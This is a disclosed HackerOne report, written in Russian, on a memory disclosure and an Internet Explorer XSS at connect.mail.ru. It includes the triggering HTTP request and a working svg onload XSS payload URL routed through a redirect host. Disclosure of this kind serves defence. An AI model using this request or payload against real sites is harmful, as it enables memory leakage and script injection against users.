---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '38615'
original_report_id: '38615'
title: '[connect.mail.ru] Memory Disclosure / IE XSS'
team_handle: mailru
created_at: '2014-12-08T10:40:31.845Z'
disclosed_at: '2016-07-11T10:07:46.556Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 7
tags:
- hackerone
---

# [connect.mail.ru] Memory Disclosure / IE XSS

## Metadata

- HackerOne Report ID: 38615
- Weakness: 
- Program: mailru
- Disclosed At: 2016-07-11T10:07:46.556Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Memory Disclosure
----

При обращении к сценариям
https://connect.mail.ru/share_friends
https://connect.mail.ru/share_count
https://connect.mail.ru/share_button

следующим образом:

> GET /xxx/%2e%2e/share_friends HTTP/1.1
> Host: connect.mail.ru

выводится ошибка о некорректном пути

> invalid request path: 'xxx'

В случае, если длина названия первой папки, указанной в пути, будет превышать 487 символов, в HTTP ответе следом за ошибкой будет показан участок памяти (см. приложенный файл).

Internet Explorer XSS
----

Также, в данной ошибке не заменяются html-сущности и возможно внедрение html-тегов в браузере Internet Explorer.

Пример:
http://blackfan.ru/x?r=https://connect.mail.ru/%3csvg%0conload=alert(document.domain)%3exxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/%252e%252e/share_count

1) Добавление сценария перенаправления (http://blackfan.ru/x?r=) необходимо для ошибки Internet Explorer (Через перенаправление Request-URI будет послан без URLEncode)
2) Длинная строка необходима для того, чтобы 400 HTTP ответ содержал больше 512 байт и Internet Explorer не заменил ошибку на стандартную
3) Так как в векторе нельзя использовать пробел и /, используется %0C который шлется без URLEncode через ошибку перенаправления

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
